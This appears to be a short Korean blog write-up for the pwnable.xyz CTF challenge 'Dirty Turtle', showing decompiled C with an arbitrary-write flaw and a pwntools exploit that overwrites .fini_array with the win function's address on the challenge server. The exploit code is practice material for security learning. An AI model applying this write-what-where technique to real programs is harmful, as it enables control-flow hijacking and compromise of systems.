---
title: "[pwnable.xyz]Dirty Turtle"
date: 2020-2-2
tags: [pwnable.xyz]
categories: [pwnable.xyz]
---

원하는 주소에 원하는 값을 쓸 수 있다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rax
  char *s; // [rsp+0h] [rbp-10h]
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  setup();
  puts("Dirty Turtle Off-RoadS");
  printf("Addr: ", argv);
  v3 = get_val();
  printf("Value: ", v3);
  v6 = get_val();
  if ( v6 )
    *s = v6;
  else
    puts(s);
  return 0;
}
```

.dtors 영역인 .fini_array을 win주소로 덮어주면 된다. 그러면 main함수 끝나고 win함수 호출된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30033)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

sa(':',str(0x0000000000600bc0)) # .fini_array
sa(':',str(e.symbols['win']))

p.interactive()
```

